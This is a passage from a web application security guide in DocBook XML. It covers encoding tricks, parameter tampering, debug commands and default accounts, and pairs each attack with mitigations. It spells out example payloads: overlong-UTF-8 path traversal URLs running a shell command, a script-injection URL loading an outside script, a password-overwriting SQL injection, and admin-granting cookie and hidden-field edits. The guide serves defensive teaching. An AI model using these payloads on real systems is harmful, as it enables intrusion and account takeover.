			Consider the representation C0 AE of a certain symbol
			(see [1]). Like UTF-8 encoding requires, the second
			octet has "10" as its two most significant bits. Now, it
			is possible to define 3 variants for it, by enumerating
			the rest possible 2 bit combinations ("00", "01" and
			"11"). Some UTF-8 decoders would treat these variants as
			identical to the original symbol (they simply use the
			least significant 6 bits, disregarding the most
			significant 2 bits). Thus, the 3 variants are C0 2E, C0
			5E and C0 FE.
			</para>
			<para>
			To further "complicate" things, each representation can
			be sent over HTTP in several ways: In the raw. That is,
			without URL encoding at all. This usually results in
			sending non ASCII octets in the path, query or body,
			which violates the HTTP standards. Nevertheless, most
			HTTP servers do get along just fine with non ASCII
			characters.
			</para>
			<para>
			Valid URL encoding. Each non ASCII character (more
			precisely, all characters that require URL encoding - a
			superset of non ASCII characters) is URL-encoded. This
			results in sending, say, %C0%AE.
			</para>
			<para>
			Invalid URL encoding. This is a variant of [2], wherein
			some hexadecimal digits are replaced with
			non-hexadecimal digits, yet the result is still
			interpreted as identical to the original, under some
			decoding algorithms. For example, %C0 is interpreted as
			character number ('C'-'A'+10)*16+('0'-'0') = 192.
			Applying the same algorithm to %M0 yields
			('M'-'A'+10)*16+('0'-'0') = 448, which, when forced into
			a single byte, yields (8 least significant bits) 192,
			just like the original. So, if the algorithm is willing
			to accept non hexadecimal digits (such as 'M'), then it
			is possible to have variants for %C0 such as %M0 and
			%BG.
			</para>
			<para>
			It should be kept in mind that these techniques are not
			directly related to Unicode, and they can be used in
			non-Unicode attacks as well.
			</para>
			<programlisting>
http://host/cgi-bin/bad.cgi?foo=../../bin/ls%20-al| 
			</programlisting>
			<para>
			URL Encoding of the example attack: 
			</para>
			<programlisting>
http://host/cgi-bin/bad.cgi?foo=..%2F../bin/ls%20-al| 
			</programlisting>
			<para>
			Unicode encoding of the example attack: 
			</para>
			<programlisting>
http://host/cgi-bin/bad.cgi?foo=..%c0%af../bin/ls%20-al| 
http://host/cgi-bin/bad.cgi?foo=..%c1%9c../bin/ls%20-al| 
http://host/cgi-bin/bad.cgi?foo=..%c1%pc../bin/ls%20-al| 
http://host/cgi-bin/bad.cgi?foo=..%c0%9v../bin/ls%20-al| 
http://host/cgi-bin/bad.cgi?foo=..%c0%qf../bin/ls%20-al| 
http://host/cgi-bin/bad.cgi?foo=..%c1%8s../bin/ls%20-al| 
http://host/cgi-bin/bad.cgi?foo=..%c1%1c../bin/ls%20-al| 
http://host/cgi-bin/bad.cgi?foo=..%c1%9c../bin/ls%20-al| 
http://host/cgi-bin/bad.cgi?foo=..%c1%af../bin/ls%20-al| 
http://host/cgi-bin/bad.cgi?foo=..%e0%80%af../bin/ls%20-al| 
http://host/cgi-bin/bad.cgi?foo=..%f0%80%80%af../bin/ls%20-al| 
http://host/cgi-bin/bad.cgi?foo=..%f8%80%80%80%af../bin/ls%20-al| 
http://host/cgi-bin/bad.cgi?foo=..%fc%80%80%80%80%af../bin/ls%20-al| 
			</programlisting>
		</sect3>
		<sect3>
			<title>
			Mitigating Techniques
			</title>
			<para>
			A suitable canonical form should be chosen and all user
			input canonicalized into that form before any
			authorization decisions are performed. Security checks
			should be carried out after UTF-8 decoding is completed.
			Moreover, it is recommended to check that the UTF-8
			encoding is a valid canonical encoding for the symbol it
			represents.
			</para>
		</sect3>
		<sect3>
			<title>
			Further Reading 
			</title>
			<para>
			http://www.ietf.org/rfc/rfc2279.txt?number=2279
			</para>
		</sect3>
	</sect2>
	<sect2>
		<title>
		URL Encoding
		</title>
		<sect3>
			<title>
			Description
			</title>
			<para>
			Traditional web applications transfer data between
			client and server using the HTTP or HTTPS protocols.
			There are basically two ways in which a server receives
			input from a client; data can be passed in the HTTP
			headers or it can be included in the query portion of
			the requested URL. Both of these methods correspond to
			form input types (either GET or POST). Because of this,
			URL manipulation and form manipulation are simply two
			sides of the same issue. When data is included in a URL,
			it must be specially encoded to conform to proper URL
			syntax.
			</para>
			<para>
			The RFC 1738 specification defining Uniform Resource
			Locators (URLs) and the RFC 2396 specification for
			Uniform Resource Identifiers (URIs) both restrict the
			characters allowed in a URL or URI to a subset of the
			US-ASCII character set. According to the RFC 1738
			specification, "only alphanumerics, the special
			characters "$-_.+!*'(),", and reserved characters used
			for their reserved purposes may be used unencoded within
			a URL." The data used by a web application, on the other
			hand, is not restricted in any way and in fact may be
			represented by any existing character set or even binary
			data. Earlier versions of HTML allowed the entire range
			of the ISO-8859-1 (ISO Latin-1) character set; the HTML
			4.0 specification expanded to permit any character in
			the Unicode character set.
			</para>
			<para>
			URL-encoding a character is done by taking the
			character's 8-bit hexadecimal code and prefixing it with
			a percent sign ("%"). For example, the US-ASCII
			character set represents a space with decimal code 32,
			or hexadecimal 20. Thus its URL-encoded representation
			is %20.
			</para>
			<para>
			Even though certain characters do not need to be
			URL-encoded, any 8-bit code (i.e., decimal 0-255 or
			hexadecimal 00-FF) may be encoded. ASCII control
			characters such as the NULL character (decimal code 0)
			can be URL-encoded, as can all HTML entities and any
			meta characters used by the operating system or
			database. Because URL-encoding allows virtually any data
			to be passed to the server, proper precautions must be
			taken by a web application when accepting data.
			URL-encoding can be used as a mechanism for disguising
			many types of malicious code.
			</para>
			<sect4>
				<title>
				Example of Embedding Malicious HTML Tags
				</title>
				<para>
				Excerpt from script.php:
				</para>
				<programlisting>
echo $HTTP_GET_VARS["mydata"];
				</programlisting>
				<para>
				HTTP request:
				</para>
				<programlisting>
http://www.myserver.c0m/script.php?mydata=%3cscript%20src=%22http%3a%2f%2fwww.yourserver.c0m%2fbadscript.js%22%3e%3c%2fscript%3e 
				</programlisting>
				<para>
				Generated HTML:
				</para>
				<programlisting>
&lt;script src="http://www.yourserver.com/badscript.js"&gt;&lt;/script&gt;
				</programlisting>
			</sect4>
			<sect4>
				<title>
				SQL Injection Example
				</title>
				<para>
				Original database query in search.asp:
				</para>
				<programlisting>
sql = "SELECT lname, fname, phone FROM usertable WHERE lname='" &amp; Request.QueryString("lname") &amp; "';" 
				</programlisting>
				<para>
				HTTP request:
				</para>
				<programlisting>
http://www.myserver.c0m/search.asp?lname=smith%27%3bupdate%20usertable%20set%20passwd%3d%27hAx0r%27%3b--%00 
				</programlisting>
				<para>
				Executed database query:
				</para>
				<programlisting>
SELECT lname, fname, phone FROM usertable WHERE lname='smith';update usertable set passwd='hAx0r'
				</programlisting>
			</sect4>
		</sect3>
		<sect3>
			<title>
			Mitigating Techniques
			</title>
			<para>
			A suitable canonical form should be chosen and all user
			input canonicalized into that form before any
			authorization decisions are performed. Security checks
			should be carried out after decoding is completed. It is
			usually the web server itself that decodes the URL and
			hence this problem may only occur on the web server
			itself.
			</para>
		</sect3>
	</sect2>
</sect1>
<sect1>
	<title>
	Parameter Manipulation
	</title>
	<para>
	Manipulating the data sent between the browser and the web
	application to an attacker's advantage has long been a simple
	but effective way to make applications do things in a way the
	user often shouldn't be able to. In a badly designed and
	developed web application, malicious users can modify things
	like prices in web carts, session tokens or values stored in
	cookies and even HTTP headers.
	</para>
	<para>
	No data sent to the browser can be relied upon to stay the same
	unless cryptographically protected at the application layer.
	Cryptographic protection in the transport layer (SSL) in no way
	protects one from attacks like parameter manipulation in which
	data is mangled before it hits the wire. Parameter tampering
	can often be done with:
	</para>
	<itemizedlist mark="opencircle" spacing="compact">
		<listitem>
			<para>
			Cookies 
			</para>
		</listitem>
		<listitem>
			<para>
			Form Fields 
			</para>
		</listitem>
		<listitem>
		<para>
		URL Query Strings 
		</para>
		</listitem>
		<listitem>
			<para>
			HTTP Headers
			</para>
		</listitem>
	</itemizedlist>
	<sect2>
		<title>
		Cookie Manipulation
		</title>
		<sect3>
			<title>
			Description
			</title>
			<para>
			Cookies are the preferred method to maintain state in
			the stateless HTTP protocol. They are however also used
			as a convenient mechanism to store user preferences and
			other data including session tokens. Both persistent and
			non-persistent cookies, secure or insecure can be
			modified by the client and sent to the server with URL
			requests. Therefore any malicious user can modify cookie
			content to his advantage. There is a popular
			misconception that non-persistent cookies cannot be
			modified but this is not true; tools like Winhex are
			freely available. SSL also only protects the cookie in
			transit.
			</para>
			<para>
			The extent of cookie manipulation depends on what the
			cookie is used for but usually ranges from session
			tokens to arrays that make authorization decisions.
			(Many cookies are Base64 encoded; this is an encoding
			scheme and offers no cryptographic protection).
			</para>
			<para>
			Example from a real world example on a travel web site
			modified to protect the innocent (or stupid).
			</para>
			<programlisting>
Cookie: lang=en-us; ADMIN=no; y=1 ; time=10:30GMT ;
			</programlisting>
			<para>
			The attacker can simply modify the cookie to;
			</para>
			<programlisting>
Cookie: lang=en-us; ADMIN=yes; y=1 ; time=12:30GMT ;
			</programlisting>
		</sect3>
		<sect3>
			<title>
			Mitigation Techniques
			</title>
			<para>
			One mitigation technique is to simply use one session
			token to reference properties stored in a server-side
			cache. This is by far the most reliable way to ensure
			that data is sane on return: simply do not trust user
			input for values that you already know. When an
			application needs to check a user property, it checks
			the userid with its session table and points to the
			users data variables in the cache / database. This is by
			far the correct way to architect a cookie based
			preferences solution.
			</para>
			<para>
			Another technique involves building intrusion detection
			hooks to evaluate the cookie for any infeasible or
			impossible combinations of values that would indicate
			tampering.  For instance, if the "administrator" flag is
			set in a cookie, but the userid value does not belong to
			someone on the development team.
			</para>
			<para>
			The final method is to encrypt the cookie to prevent
			tampering. There are several ways to do this including
			hashing the cookie and comparing hashes when it is
			returned or a symmetric encryption , although server
			compromise will invalidate this approach and so response
			to penetration must include new key generation under
			this scheme.
			</para>
		</sect3>
	</sect2>
	<sect2>
		<title>
		HTTP Header Manipulation
		</title>
		<sect3>
			<title>
			Description
			</title>
			<para>
			HTTP headers are control information passed from web
			clients to web servers on HTTP requests, and from web
			servers to web clients on HTTP responses. Each header
			normally consists of a single line of ASCII text with a
			name and a value. Sample headers from a POST request
			follow.
			</para>
			<programlisting>
Host: www.someplace.org
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Lynx/2.8.4dev.9 libwww-FM/2.14
Referer: http://www.someplace.org/login.php
Content-type: application/x-www-form-urlencoded
Content-length: 49
			</programlisting>
			<para>
			Often HTTP headers are used by the browser and the web
			server software only. Most web applications pay no
			attention to them. However some web developers choose
			to inspect incoming headers, and in those cases it is
			important to realize that request headers originate at
			the client side, and they may thus be altered by an
			attacker.
			</para>
			<para>
			Normal web browsers do not allow header
			modification. An attacker will have to write his own
			program (about 15 lines of perl code will do) to perform
			the HTTP request, or he may use one of several freely
			available proxies that allow easy modification of any
			data sent from the browser.
			</para>
			<para>
			Example 1: The Referer header (note the spelling), which
			is sent by most browsers, normally contains the URL of
			the web page from which the request originated. Some web
			sites choose to check this header in order to make sure
			the request originated from a page generated by them,
			for example in the belief it prevents attackers from
			saving web pages, modifying forms, and posting them off
			their own computer. This security mechanism will fail,
			as the attacker will be able to modify the Referer
			header to look like it came from the original site.
			</para>
			<para>
			Example 2: The Accept-Language header indicates the
			preferred language(s) of the user. A web application
			doing internationalization (i18n) may pick up the
			language label from the HTTP header and pass it to a
			database in order to look up a text. If the content of
			the header is sent verbatim to the database, an attacker
			may be able to inject SQL commands (see SQL injection)
			by modifying the header. Likewise, if the header content
			is used to build a name of a file from which to look up
			the correct language text, an attacker may be able to
			launch a path traversal attack.
			</para>
		</sect3>
		<sect3>
			<title>
			Mitigation Techniques
			</title>
			<para>
			Simply put headers cannot be relied upon without
			additional security measures. If a header originated
			server-side such as a cookie it can be cryptographically
			protected. If it originated client-side such as a
			referer it should not be used to make any security
			decisions.
			</para>
		</sect3>
		<sect3>
			<title>
			Further Reading
			</title>
			<para>
			For more information on headers, please see RFC 2616
			which defines HTTP/1.1.
			</para>
		</sect3>
	</sect2>
	<sect2>
		<title>
		HTML Form Field Manipulation
		</title>
		<sect3>
			<title>
			Description
			</title>
			<para>
			When a user makes selections on an HTML page, the
			selection is typically stored as form field values and
			sent to the application as an HTTP request (GET or
			POST). HTML can also store field values as Hidden
			Fields, which are not rendered to the screen by the
			browser but are collected and submitted as parameters
			during form submissions.
			</para>
			<para>
			Whether these form fields are pre-selected (drop down,
			check boxes etc.), free form or hidden, they can all be
			manipulated by the user to submit whatever values he/she
			chooses. In most cases this is as simple as saving the
			page using "view source", "save", editing the HTML and
			re-loading the page in the web browser.
			</para>
			<para>
			As an example an application uses a simple form to
			submit a username and password to a CGI for
			authentication using HTTP over SSL. The username and
			password form fields look like this.
			</para>

			<mediaobject>
				<imageobject>
					<imagedata fileref="images/login_form.png" format="PNG"/>
				</imageobject>
				<textobject>
					<phrase>A sample login form.</phrase>
				</textobject>
			</mediaobject>

			<para>
			Some developers try to prevent the user from entering
			long usernames and passwords by setting a form field
			value maxlength=(an integer) in the belief they will
			prevent the malicious user attempting to inject buffer
			overflows of overly long parameters. However the
			malicious user can simply save the page, remove the
			maxlength tag and reload the page in his browser. Other
			interesting form fields include disabled, readonly and
			value. As discussed earlier, data (and code) sent to
			clients must not be relied upon until in responses until
			it is vetted for sanity and correctness. Code sent to
			browsers is merely a set of suggestions and has no
			security value.
			</para>
			<para>
			Hidden Form Fields represent a convenient way for
			developers to store data in the browser and are one of
			the most common ways of carrying data between pages in
			wizard type applications. All of the same rules apply to
			hidden forms fields as apply to regular form fields.
			</para>
			<para>
			Example 2 - Take the same application. Behind the login
			form may have been the HTML tag;
			</para>
			<programlisting>
&lt;input name="masteraccess" type="hidden" value="N"&gt;
			</programlisting>
			<para>
			By manipulating the hidden value to a Y, the application
			would have logged the user in as an Administrator.
			Hidden form fields are extensively used in a variety of
			ways and while it's easy to understand the dangers
			they still are found to be significantly vulnerable in
			the wild.
			</para>
		</sect3>
		<sect3>
			<title>
			Mitigation Techniques
			</title>
			<para>
			Instead of using hidden form fields, the application
			designer can simply use one session token to reference
			properties stored in a server-side cache. When an
			application needs to check a user property, it checks
			the session cookie with its session table and points to
			the user's data variables in the cache / database. This
			is by far the correct way to architect this problem.
			</para>
			<para>
			If the above technique of using a session variable
			instead of a hidden field cannot be implemented, a
			second approach is as follows.
			</para>
			<para>
			The name/value pairs of the hidden fields in a form can
			be concatenated together into a single string. A secret
			key that never appears in the form is also appended to
			the string. This string is called the Outgoing Form
			Message. An MD5 digest or other one-way hash is
			generated for the Outgoing Form Message. This is called
			the Outgoing Form Digest and it is added to the form as
			an additional hidden field.
			</para>
			<para>
			When the form is submitted, the incoming name/value
			pairs are again concatenated along with the secret key
			into an Incoming Form Message. An MD5 digest of the
			Incoming Form Message is computed. Then the Incoming
			Form Digest is compared to the Outgoing Form Digest
			(which is submitted along with the form) and if they do
			not match, then a hidden field has been altered. Note,
			for the digests to match, the name/value pairs in the
			Incoming and Outgoing Form Messages must concatenated
			together in the exact same order both times.
			</para>
			<para>
			This same technique can be used to prevent tampering
			with parameters in a URL. An additional digest parameter
			can be added to the URL query string following the same
			technique described above.
			</para>
		</sect3>
	</sect2>
	<sect2>
		<title>
		URL Manipulation
		</title>
		<sect3>
			<title>
			Description
			</title>
			<para>
			URL Manipulation comes with all of the problems stated
			above about Hidden Form Fields, and creates some new
			problems as well.
			</para>
			<para>
			HTML Forms may submit their results using one of two
			methods: GET or POST. If the method is GET, all form
			element names and their values will appear in the query
			string of the next URL the user sees. Tampering with
			hidden form fields is easy enough, but tampering with
			query strings is even easier. One need only look at the
			URL in the browser's address bar. 
			</para>
			<para>
			Take the following example; a web page allows the
			authenticated user to select one of his pre-populated
			accounts from a drop-down box and debit the account with
			a fixed unit amount. It's a common scenario. His/her
			choices are recorded by pressing the submit button. The
			page is actually storing the entries in form field
			values and submitting them using a form submit command.
			The command sends the following HTTP request.
			</para>
			<programlisting>
http://www.victim.com/example?accountnumber=12345&amp;debitamount=1
			</programlisting>
			<para>
			A malicious user could construct his own account number
			and change the parameters as follows:
			</para>
			<programlisting>
http://www.victim.com/example?accountnumber=67891&amp;creditamount=999999999
			</programlisting>
			<para>
			Thee new parameters would be sent to the application and
			be processed accordingly.
			</para>
			<para>
			This seems remarkably obvious but has been the problem
			behind several well-published attacks including one
			where hackers bought tickets from the US to Paris for
			$25 and flew to hold a hacking convention. Another
			well-known electronic invitation service allowed users
			to guess the account ID and login as a specific user
			this way; a fun game for the terminally bored with
			voyeuristic tendencies.
			</para>
			<para>
			Unfortunately, it isn't just HTML forms that present
			these problems. Almost all navigation done on the
			internet is through hyperlinks. When a user clicks on a
			hyperlink to navigate from one site to another, or
			within a single application, he is sending GET requests.
			Many of these requests will have a query string with
			parameters just like a form. And once again, a user can
			simply look in the "Address" window of his browser and
			change the parameter values.
			</para>
		</sect3>
		<sect3>
			<title>
			Mitigation Techniques
			</title>
			<para>
			Solving URL manipulation problems takes planning.
			Different techniques can be used in different
			situations. The best solution is to avoid putting
			parameters into a query string (or hidden form field).
			</para>
			<para>
			When parameters need to be sent from a client to a
			server, they should be accompanied by a valid session
			token. The session token may also be a parameter, or a
			cookie. Session tokens have their own special security
			considerations described previously. In the example
			above, the application should not make changes to the
			account without first checking if the user associated
			with the session has permission to edit the account
			specified by the parameter "accountnumber". The script
			that processes a credit to an account cannot assume that
			access control decisions were made on previous
			application pages. Parameters should never be operated
			on unless the application can independently validate
			they were bound for and are authorized to be acted on.
			</para>
			<para>
			However, a second form of tampering is also evident in
			the example. Notice that the creditamount is increased
			from 1 to 999999999. Imagine that the user doesn't
			tamper with the accountnumber but only with the amount.
			He may be crediting his own account with a very large
			sum instead of $1. Clearly this is a parameter that
			should simply not be present in the URL.
			</para>
			<para>
			There are two reasons why a parameter should not be a
			URL (or in a form as a hidden field). The above example
			illustrates one reason - the parameter is one the user
			should not be able to set the value of. The second is if
			a parameter is one the user should not be able to see
			the value of. Passwords are a good example of the
			latter. Users's should not even see their own passwords
			in a URL because someone may be standing behind them and
			because browsers record URL histories. See Browser
			History Attack.
			</para>
			<para>
			If a sensitive parameter cannot be removed from a URL,
			it must be cryptographically protected. Cryptographic
			protection can be implemented in one of two ways. The
			better method is to encrypt an entire query string (or
			all hidden form field values). This technique both
			prevents a user from setting the value and from seeing
			the value.
			</para>
			<para>
			A second form of cryptographic protection is to add an
			additional parameter whose value is an MD5 digest of the
			URL query string (or hidden form fields) More details of
			this technique are described above in the section "HTML
			Form Field Manipulation". This method does not prevent a
			user from seeing a value, but it does prevent him from
			changing the value.
			</para>
		</sect3>
	</sect2>
</sect1>
<sect1>
	<title>
	Miscellaneous
	</title>
	<sect2>
		<title>
		Vendors Patches
		</title>
		<para>
		Vulnerabilities are common within 3rd party tools and products
		that are installed as part of the web applications. These
		web-server, application server, e-comm suites, etc. are
		purchased from external vendors and installed as part of the
		site. The vendor typically addresses such vulnerabilities by
		supplying a patch that must be downloaded and installed as an
		update to the product at the customer's site.
		</para>
		<para>
		A significant part of the web application is typically not
		customized and specific for a single web site but rather made up
		of standard products supplied by 3rd party vendors. Typically
		such products serve as the web server, application server,
		databases and more specific packages used in the different
		vertical markets. All such products have vulnerabilities that
		are discovered in an ongoing manner and in most cases disclosed
		directly to the vendor (although there are also cases in which
		the vulnerability is revealed to the public without disclosure
		to the vendor). The vendor will typically address the
		vulnerability by issuing a patch and making it available to the
		customers using the product, with or without revealing the full
		vulnerability. The patches are sometimes grouped in patch groups
		(or updates) that may be released periodically.
		</para>
		<para>
		A vendors disclosure policy of vulnerabilities is of primary
		concern to those deploying ciritcal systems. Those in a
		procurement position should be very aware of the End User
		License Agreements (EULAs) under which vendors license their
		software. Very often these EULAs disclaim all liability on the
		part of the vendor, even in cases of serious neglect, leaving
		users with little or no recourse. Those deploying software
		distributed under these licenses are now fully liable for damage
		caused by the defects that may be a part of this code. Due to
		this state of affairs, it becomes ever more important that
		orginizations insist upon open discussion and disclosure of
		vulnerabilities in the software they deploy. Vendors have
		reputations at stake when new vulnerabilities are disclosed and
		many attempt to keep such problems quiet, thereby leaving their
		clients without adequate information in asessing their exposure
		to threats. This behaviour is unacceptable in a mature software
		industry and should not be tollerated. Furthermore,
		orginizations should take care to ensure that vendors do not
		attempt to squelch information needed to verify the validity and
		effectiveness of patches. While this might seem a frivilous
		concern at first glance, vendors have been known to try to limit
		distribution of this information in order to provide "security"
		through obscurity. Customers may be actively harmed in the
		meanwhile as Black Hats have more information about a problem
		than White Hats do, again imparing an organizations ability to
		assess its risk exposure.
		</para>
		<para>
		The main issue with vendor patches is the latency between the
		disclosure of the vulnerability to the actual deployment of the
		patch in the production environment i.e. the patch latency and
		the total time needed to issue the patch by the vendor, download
		of the patch by the client, test of the patch in a QA or staging
		environment and finally full deployment in the production site.
		During all this time the site is vulnerable to attacks on this
		published vulnerability. This results in misuse of the patch
		releases to achieve opposite results by humans and more recently
		by worms such as CodeRed.
		</para>
		<para>
		Most patches are released by the vendors only in their site and
		in many cases published only in internal mailing lists or sites.
		Sites and lists following such vulnerabilities and patches (such
		as bugtraq) do not serve as a central repository for all
		patches. The number of such patches for mainstream products is
		estimated at dozens a month.
		</para>
		<para>
		The final critical aspect of patches is that they are not (in
		most cases) signed or containing a checksum causing them to be a
		potential source of Trojans in the system.
		</para>
		<para>
		You should subscribe to vendors' security intelligence service
		for all software that forms part of your web application or a
		security infrastructure.
		</para>
	</sect2>
	<sect2>
		<title>
		System Configuration
		</title>
		<para>
		Server software is often complex, requiring much understanding
		of both the protocols involved and their internal workings to
		correctly configure. Unfortunantly software makes this task much
		more difficult by providing default configurations which are
		known to be vulnerable to devastating attacks. Often "sample"
		files and directories are installed by default which may provide
		attackers with ready-made attacks should problems be found in
		the sample files. While many vendors suggest removing these
		files by default, they put the onus of securing an "out of the
		box" installation on those deploying their product. A (very) few
		vendors attempt to provide secure defaults for their systems
		(the OpenBSD project being an example). Systems from these
		vendors often prove much less vulnerable to widespread attack,
		this approach to securing infrastructure appears to work very
		well and should be encouraged when discussing procurement with
		vendors.
		</para>
		<para>
		If a vendor provides tools for managing and securing
		installations for your software, it may be worth evaluating
		these tools, however they will never be a full replacement for
		understanding how a system is designed to work and strictly
		managing configurations across your deployed base.
		</para>
		<para>
		Understanding how system configuration affects security is
		crucial to effective risk management. Systems being deploying
		today rely on so many layers of software that a system may be
		compromised from vectors which may be difficult or impossible to
		predict. Risk management and threat analysis seeks to quantify
		this risk, minimize the impact of the inevitable failure, and
		provide means (other than technical) for compensating for threat
		exposure. Configuration management is a well understood piece of
		this puzzle, yet remains maddeningly difficult to implement
		well. As configurations and environmental factors may change
		over time, a system once well shielded by structural safeguards
		may become a weak link with very little outward indication that
		the risk inherent in a system has changed. Organizations will
		have to accept that configuration management is a continuing
		process and cannot simply be done once and let be.  Effectively
		managing configurations can be a first step in putting in place
		the safeguards that allow systems to perform reliably in the
		face of concerted attack.
		</para>
	</sect2>
	<sect2>
		<title>
		Comments in HTML
		</title>
		<sect3>
			<title>
			Description
			</title>
			<para>
			It's amazing what one can find in comments. Comments
			placed in most source code aid readability and improve
			documented process. The practice of commenting has been
			carried over into the development of HTML pages, which
			are sent to the clients' browser. As a result
			information about the structure of the a web site or
			information intended only for the system owners or
			developers can sometimes be inadvertently revealed.
			</para>
			<para>
			Comments left in HTML can come in many formats, some as
			simple as directory structures, others inform the
			potential attacker about the true location of the web
			root. Comments are sometimes left in from the HTML
			development stage and can contain debug information,
			cookie structures, problems associated with development
			and even developer names, emails and phone numbers.
			</para>
			<para>
			Structured Comments - these appear in HTML source,
			usually at the top of the page or between the JavaScript
			and the remaining HTML, when a large development team
			has been working on the site for some time.
			</para>
			<para>
			Automated Comments - many widely used page generation
			utilities and web usage software automatically adds
			signature comments into the HTML page. These will inform
			the attacker about the precise software packages
			(sometimes even down to the actual release) that is
			being used on the site. Known vulnerabilities in those
			packages can then be tried out against the site.
			</para>
			<para>
			Unstructured Comments - these are one off comments made
			by programmers almost as an "aid memoir" during
			development. These can be particularly dangerous as they
			are not controlled in any way. Comments such as "The
			following hidden field must be set to 1 or XYZ.asp
			breaks" or "Don't change the order of these table
			fields" are a red flag to a potential attacker and sadly
			not uncommon.

			</para>
		</sect3>
		<sect3>
			<title>
			Mitigation Techniques
			</title>
			<para>
			For most comments a simple filter that strips comments
			before pages are pushed to the production server is all
			that is required. For Automated Comments an active
			filter may be required. It is good practice to tie the
			filtering process to sound deployment methodologies so
			that only known good pages are ever released to
			production.
			</para>
		</sect3>
	</sect2>
	<sect2>
		<title>
		Old, Backup and Un-referenced Files
		</title>
		<sect3>
			<title>
			Description
			</title>
			<para>
			File / Application Enumeration is a common technique
			that is used to look for files or applications that may
			be exploitable or be useful in constructing an attack.
			These include known vulnerable files or applications,
			hidden or un-referenced files and applications and
			back-up / temp files.
			</para>
			<para>
			File /Application enumeration uses the HTTP server
			response codes to determine if a file or application
			exists. A web server will typically return an HTTP 200
			response code if the file exists and an HTTP 404
			response code if the file does not exist. This enables
			an attacker to feed in lists of known vulnerable files
			and suspected applications or use some basic logic to
			map the file and application structure visible from the
			presentation layer.
			</para>
			<para>
			Known Vulnerable Files - Obviously many known vulnerable
			files exist, and in fact looking for them is one of the
			most common techniques that commercial and free-ware
			vulnerability scanners use. Many people will focus their
			search on cgi's for example or server specific issues
			such as IIS problems. Many daemons install "sample" code
			in publicly accessible locations, which are often found
			to have security problems. Removing (or simply not
			installing) such default files cannot be recommended
			highly enough.
			</para>
			<para>
			Hidden / Un-Referenced Files - Many web site
			administrators leave files on the web server such as
			sample files or default installation files. When the web
			content is published, these files remain accessible
			although are un-referenced by any HTML in the web. Many
			examples are notoriously insecure, demonstrating things
			like uploading files from a web interface for instance.
			If an attacker can guess the URL, then he is typically
			able to access the resource.
			</para>
			<para>
			Back-Up Files / Temp Files - Many applications used to
			build HTML and things like ASP pages leave temp files
			and back-up files in directories. These often get
			up-loaded either manually in directory copies or
			automagically by site management modules of HTML
			authoring tools like Microsoft's Frontpage or Adobe
			Go-Live. Back-up files are also dangerous as many
			developers embed things into development HTML that they
			later remove for production. Emacs for instance writes a
			*.bak in many instances. Development staff turnover may
			also be an issue, and security through obscurity is
			always an ill-advised course of action.
			</para>
		</sect3>
		<sect3>
			<title>
			Mitigation Techniques
			</title>
			<para>
			Remove all sample files from your web server. Ensure
			that any unwanted or unused files are removed. Use a
			staging screening process to look for back-up files. A
			simple recursive file grep of all extensions that are
			not explicitly allowed is very effective.
			</para>
			<para>
			Some web server / application servers that build dynamic
			pages will not return a 404 message to the browser, but
			instead return a page such as the site map. This
			confuses basic scanners into thinking that all files
			exist. Modern vulnerability scanners however can take a
			custom 404 and treat it as a vanilla 404 so this
			technique only slows progress.
			</para>
		</sect3>
	</sect2>
	<sect2>
		<title>
		Debug Commands
		</title>
		<sect3>
			<title>
			Description
			</title>
			<para>
			Debug commands actually come in two distinct forms
			</para>
			<para>
			Explicit Commands - this is where a name value pair has
			been left in the code or can be introduced as part of
			the URL to induce the server to enter debug mode. Such
			commands as "debug=on" or "Debug=YES" can be placed on
			the URL like:
			</para>
			<programlisting>
http://www.somewebsite.com/account_check?ID=8327dsddi8qjgqllkjdlas&amp;Disp=no
			</programlisting>
			<para>
			Can be altered to:
			</para>
			<programlisting>
http://www.somewebsite.com/account_check?debug=on&amp;ID=8327dsddi8qjgqllkjdlas&amp;Disp=no
			</programlisting>
			<para>
			The attacker observes the resultant server behavior. The
			debug construct can also be placed inside HTML code or
			JavaScript when a form is returned to the server, simply
			by adding another line element to the form construction,
			the result is the same as the command line attack above.
			</para>
			<para>
Implicit Commands - this is where seemingly innocuous elements on a page if altered have dramatic effects on the server. The original intent of these elements was to help the programmer modify the system into various states to allow a faster testing cycle time. These element are normally given obscure names such as "fubar1" or "mycheck" etc. These elements may appear in the source as:
			</para>
			<programlisting>
&lt;!-- begins --&gt;
&lt;TABLE BORDER=0 ALIGN=CENTER CELLPADDING=1 CELLSPACING=0>&gt;
&lt;FORM METHOD=POST ACTION="http://some_poll.com/poll?1688591" TARGET="sometarget" FUBAR1="666"&gt;
&lt;INPUT TYPE=HIDDEN NAME="Poll" VALUE="1122"&gt;
&lt;!-- Question 1 --&gt;
&lt;TR&gt;
&lt;TD align=left colspan=2&gt;
&lt;INPUT TYPE=HIDDEN NAME="Question" VALUE="1"&gt;
&lt;SPAN class="Story"&gt;
			</programlisting>
			<para>
			Finding debug elements is not easy, but once one is
			located it is usually tried across the entire web site
			by the potential hacker. As designers never intend for
			these commands to be used by normal users, the
			precautions preventing parameter tampering are usually
			not taken.
			</para>
			<para>
			Debug commands have been known to remain in 3rd party
			code designed to operate the web site, such as web
			servers, database programs. Search the web for "Netscape
			Engineers are weenies" if you don't believe us!
			</para>
		</sect3>
	</sect2>
	<sect2>
		<title>
		Default Accounts
		</title>
		<sect3>
			<title>
			Description
			</title>
			<para>
			Many "off the shelf" web applications typically have at
			least one user activated by default. This user, which is
			typically the administrator of the system, comes
			pre-configured on the system and in many cases has a
			standard password. The system can then be compromised by
			attempting access using these default values.
			</para>
			<para>

			Web applications enable multiple default accounts on the system, for example:
			</para>
			<itemizedlist mark="opencircle" spacing="compact">
				<listitem>
					<para>
					Administrator accounts
					</para>
				</listitem>
				<listitem>
					<para>
					Test accounts
					</para>
				</listitem>
				<listitem>
					<para>
					Guest accounts
					</para>
				</listitem>
			</itemizedlist>
			<para>
			The accounts can be accessed from the web either using
			the standard access for all defined account or via
			special ports or parts of the application, such as
			administrator pages. The default accounts usually come
			with pre-configured default passwords whose value is
			widely known. Moreover, most applications do not force a
			change to the default password.
			</para>
			<para>
			The attack on such default accounts can occur in two ways:
			</para>
			<itemizedlist mark="opencircle" spacing="compact">
				<listitem>
					<para>
					Attempt to use the default
					username/password assuming that it was
					not changed during the default
					installation.
					</para>
				</listitem>
				<listitem>
					<para>
					Enumeration over the password only since
					the user name of the account is known.
					</para>
				</listitem>
			</itemizedlist>
			<para>
			Once the password is entered or guessed then the attacker has access to the site according to the account's permissions, which usually leads in two major directions:
			</para>
			<para>
			If the account was an administrator account then the attacker has partial or complete control over the application (and sometimes, the whole site) with the ability to perform any malicious action.
			</para>
			<para>
